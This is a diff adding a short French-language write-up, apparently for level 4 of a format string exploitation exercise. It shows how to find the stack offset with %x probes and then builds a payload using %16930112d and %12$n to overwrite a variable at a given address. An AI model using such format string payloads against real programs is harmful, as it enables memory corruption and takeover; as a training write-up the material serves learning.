@@ -1,0 +1,22 @@
+## Level 4
+
+Toujour printf(buffer) puis comparaison entre m et une value.  
+Probleme la value a injecter est plus grande que lenght du buffer.      
+Ici on passe par une fonction d'une fonction, donc on essaye de print l'address.
+
+Donc 2 probleme.
+
+1 on va essayer de reimprimer l'addresse de la variable avec printf dans la stack pour voir ou elle est.   
+
+print("aaaa" "%x %x %x %x %x")
+ca ne donne rien,  
+On essaye avec plus d'addresse sur la pile :
+print("aaaa" "%x %x %x %x %x %x %x %x %x %x %x %x)
+On retrouve en 12eme argument "61616161", l'address equivalente a "aaaa".  
+Ici m a pour address : 08049810.
+Donc notre print resemblera a print("\x10\x98\x04\x08" "something" "%12$n")   
+
+La valeur de comparaison a m c'est  0x1025544 soit : 16930116 en decimale.  
+
+Petit astuce ici pour faire une sting injection on va utilier `%nbr_d` pour ajouter autant d'espace que de nbr_, toujour en sachant qu'on a deja imprimer 4 caracteres correspondant a l'addresse de m : 
+print("\x10\x98\x04\x08" "%16930112d" "%12$n")
